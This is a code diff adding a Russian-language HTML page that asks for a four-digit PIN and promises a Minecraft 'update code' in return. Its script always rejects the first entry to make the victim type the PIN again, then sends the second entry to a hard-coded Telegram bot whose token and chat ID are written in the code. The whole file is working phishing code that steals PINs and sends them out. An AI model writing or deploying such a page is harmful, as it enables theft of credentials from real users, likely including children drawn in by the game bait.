@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Code</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        #pin-container {
+            text-align: center;
+        }
+        #pin-input {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .pin-circle {
+            border: 2px solid #000;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            margin: 5px;
+        }
+        .filled {
+            background-color: #000;
+        }
+        .error {
+            background-color: #ff4c4c;
+        }
+        #error-message, #success-message {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+        #success-message {
+            color: green;
+        }
+        .shake {
+            animation: shake 0.5s;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div id="pin-container">
+        <p>PIN-CODE</p>
+        <div id="pin-input">
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+        </div>
+        <p id="error-message">Неверный пароль. Пожалуйста, попробуйте еще раз.</p>
+        <p id="success-message">Вот ваш код для обновления Minecraft -Id74838848</p>
+    </div>
+
+    <script>
+        let pin = [];
+        let attemptCount = 0;
+        const pinCircles = document.querySelectorAll('.pin-circle');
+
+        function updatePinDisplay(error = false) {
+            pinCircles.forEach((circle, index) => {
+                if (pin[index]) {
+                    circle.classList.add('filled');
+                    if (error) {
+                        circle.classList.add('error');
+                    } else {
+                        circle.classList.remove('error');
+                    }
+                } else {
+                    circle.classList.remove('filled', 'error');
+                }
+            });
+        }
+
+        function shakeAndVibrate() {
+            document.getElementById('pin-container').classList.add('shake');
+            navigator.vibrate([200, 100, 200]); // Вибрация
+            setTimeout(() => {
+                document.getElementById('pin-container').classList.remove('shake');
+            }, 500);
+        }
+
+        document.addEventListener('keydown', (event) => {
+            if (event.key >= '0' && event.key <= '9' && pin.length < 4) {
+                pin.push(event.key);
+                updatePinDisplay();
+            } else if (event.key === 'Backspace' && pin.length > 0) {
+                pin.pop();
+                updatePinDisplay();
+            }
+
+            if (pin.length === 4) {
+                validatePin(pin.join(''));
+            }
+        });
+
+        function validatePin(enteredPin) {
+            attemptCount++;
+            if (attemptCount === 1) {
+                // Первый ввод: всегда неверный
+                document.getElementById('error-message').style.display = 'block';
+                updatePinDisplay(true);
+                shakeAndVibrate();
+                setTimeout(() => {
+                    pin = [];
+                    updatePinDisplay();
+                    document.getElementById('error-message').style.display = 'none';
+                }, 1000);
+            } else {
+                // Второй ввод: всегда успешный
+                document.getElementById('success-message').style.display = 'block';
+                sendPinToTelegram(enteredPin);
+            }
+        }
+
+        function sendPinToTelegram(pin) {
+            // Отправка PIN-кода в Telegram-бота
+            const botToken = '7352444289:AAGahXx4XTy3COe1hnioJfPBpF8KNumhYgM';
+            const chatId = '5353040565';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `Введен PIN: ${pin}. Код для обновления Minecraft: Id74838848`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+    </script>
+</body>
+</html>
